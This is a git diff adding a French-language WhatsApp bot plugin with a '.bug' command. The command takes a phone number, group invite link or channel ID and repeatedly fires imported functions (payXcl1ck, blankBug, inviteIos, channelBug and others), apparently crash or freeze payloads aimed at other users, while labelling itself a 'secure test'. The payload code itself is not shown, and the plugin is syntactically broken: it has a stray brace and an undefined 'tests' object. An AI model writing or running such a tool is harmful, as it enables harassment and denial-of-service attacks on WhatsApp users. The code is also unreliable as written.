@@ -1,0 +1,159 @@
+const { cmd } = require('../arslan');
+const config = require('../config');
+const {
+    payXcl1ck,
+    blankBug,
+    blanking,
+    inviteAndroid,
+    inviteIos,
+    channelBug,
+    superBug
+} = require('../lib/bug-fonction');
+
+cmd({
+    pattern: "bug",
+    alias: ["bugtest"],
+    react: "🧪",
+    desc: "Effectue un test sécurisé",
+    category: "misc",
+    filename: __filename
+},
+async (conn, mek, m, { from, reply, args }) => {
+    try {
+        const sub = (args[0] || '').toLowerCase();
+        const param = args[1] || '';
+
+        // Déterminer la cible
+        let targetJid = from;
+
+        if (param) {
+            if (param.includes('chat.whatsapp.com')) {
+                try {
+                    const code = param
+                        .split('/')
+                        .pop()
+                        .split('?')[0];
+
+                    const info = await conn.groupGetInviteInfo(code);
+                    targetJid = info.id;
+                } catch (e) {
+                    return reply('❌ Le lien du groupe est invalide !');
+                }
+            } else if (param.includes('@newsletter')) {
+                targetJid = param;
+            } else {
+                const number = param.replace(/[^0-9]/g, '');
+
+                if (!number) {
+                    return reply('❌ Numéro invalide !');
+                }
+
+                targetJid = `${number}@s.whatsapp.net`;
+            }
+        }
+
+        let bugLabel = '';
+
+if (sub === 'android') {
+    for (let i = 0; i < 3; i++) {
+        await payXcl1ck(targetJid);
+    }
+    bugLabel = '🤖 Android Test';
+
+} else if (sub === 'ios') {
+    for (let i = 0; i < 3; i++) {
+        await inviteIos(targetJid);
+    }
+    bugLabel = '🍎 iOS Test';
+
+} else if (sub === 'blank') {
+    await blankBug(targetJid);
+    bugLabel = '⬜ Blank Test';
+
+} else if (sub === 'blanking') {
+    for (let i = 0; i < 3; i++) {
+        await blanking(targetJid);
+    }
+    bugLabel = '💬 Blanking Test';
+
+} else if (sub === 'invite') {
+    for (let i = 0; i < 3; i++) {
+        await inviteAndroid(targetJid);
+    }
+    bugLabel = '📨 Invite Android Test';
+
+} else if (sub === 'inviteios') {
+    for (let i = 0; i < 3; i++) {
+        await inviteIos(targetJid);
+    }
+    bugLabel = '📨 Invite iOS Test';
+
+} else if (sub === 'channel') {
+    const channelTarget =
+        param.includes('@newsletter')
+            ? param
+            : targetJid;
+
+    for (let i = 0; i < 3; i++) {
+        await channelBug(channelTarget);
+    }
+
+    bugLabel = '📢 Channel Test';
+}
+        };
+
+        // Aucune commande indiquée
+        if (!tests[sub]) {
+            return reply(
+`╭──────────────◇
+│ ✧ 🧪 *𝐁𝐔𝐆 𝐓𝐄𝐒𝐓*
+│
+│ ▸ .bug android 509xxxxxxx
+│ ▸ .bug ios 509xxxxxxx
+│ ▸ .bug blank 509xxxxxxx
+│ ▸ .bug blanking 509xxxxxxx
+│ ▸ .bug invite 509xxxxxxx
+│ ▸ .bug inviteios 509xxxxxxx
+│ ▸ .bug channel 509xxxxxxx
+│ ▸ .bug all 509xxxxxxx
+│
+│ 💡 *Lien de groupe :*
+│ ▸ .bug all https://chat.whatsapp.com/xxx
+│
+│ 🛡️ Mode : *Test sécurisé*
+╰──────────────◇
+> *𝐌𝐚𝐝𝐞 𝐈𝐧 𝐁y 𝐏rince 𝐏remium*`
+            );
+        }
+
+        const selected = tests[sub];
+
+        // Message de test sécurisé
+        await conn.sendMessage(
+            targetJid,
+            {
+                text:
+`${selected.message}
+
+╭──────────────◇
+│ 🛡️ *Mode sécurisé*
+│ 📌 *Type* : ${selected.label}
+╰──────────────◇
+> *𝐌𝐚𝐝𝐞 𝐈𝐧 𝐁𝐲 𝐏rince 𝐏remium*`
+            },
+            { quoted: mek }
+        );
+
+        // Confirmation
+        await reply(
+`✅ *${selected.label}* envoyé avec succès !
+
+📍 *Cible* : ${param || 'conversation actuelle'}
+🛡️ *Mode* : Test sécurisé`
+        );
+
+    } catch (e) {
+        console.error('[BUG PLUGIN ERROR]', e);
+        reply(`❌ 𝐄𝐫𝐫𝐞𝐮𝐫 : ${e.message}`);
+    }
+});
